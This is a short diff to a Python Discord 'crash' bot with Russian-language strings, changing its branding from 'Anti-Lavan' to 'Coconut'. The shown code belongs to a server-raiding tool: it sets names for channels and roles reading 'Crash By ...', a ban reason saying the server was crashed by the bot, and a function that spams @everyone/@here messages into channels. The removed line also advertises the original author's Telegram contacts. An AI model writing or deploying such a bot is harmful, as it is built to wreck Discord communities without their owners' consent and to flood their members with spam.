@@ -40,9 +40,9 @@ if 'да' in str(echo.lower()):
 else:
     pass
 
-channelname = 'Crash By Anti-Lavan'
-rolename = 'Crashed By Anti-Lavan'
-reasonb = 'Сервер крашнут ботом Anti-Lavan'
+channelname = 'Crash By Coconut'
+rolename = 'Crashed By Coconut'
+reasonb = 'Сервер крашнут ботом Кокоса'
 
 intents = discord.Intents.default()
 intents.members = True
@@ -135,7 +135,7 @@ async def icon(ctx):
 async def sendspam(channel):
         try:
             for _ in range(5):
-                await channel.send('@everyone / @here\nДанный сервер крашиться ботом Anti-Lavan (разработчик в telegram - `@forzel_discord`)\nTelegram channel: https://t.me/protectcheck')
+                await channel.send('@everyone / @here\nДанный сервер крашиться ботом Coconut')
         except:
             print(f'{Fore.RED}[ ERROR ] Не отправил спам на сервер {channel.guild.name} в канал #{channel.name}')
 
